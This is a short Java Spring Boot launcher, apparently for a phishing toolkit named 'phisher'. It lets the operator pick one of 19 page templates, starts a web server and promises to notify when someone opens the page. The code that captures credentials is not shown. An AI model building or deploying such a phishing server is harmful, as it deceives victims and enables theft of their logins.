package com.shaw.phisher;

import com.shaw.phisher.utils.Banner;
import com.shaw.phisher.utils.Constants;
import com.shaw.phisher.utils.Operations;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.util.Scanner;

@SpringBootApplication
public class PhisherApplication {

    public static void main(String[] args) {
        Banner.printBanner();
        Banner.printOptions();

        Scanner sc = new Scanner(System.in);
        System.out.print("\u001b[38;5;82m"+"Enter your choice: ");
        int choice = sc.nextInt();

        while (choice > 19 || choice < 1) {
            System.out.print("Enter a valid choice: ");
            choice = sc.nextInt();
        }

        Operations.writeActiveFile(Constants.options.get(choice - 1));
        SpringApplication.run(PhisherApplication.class, args);

        System.out.println("\n\nWill notify here if anyone opens your page\n");
    }

}
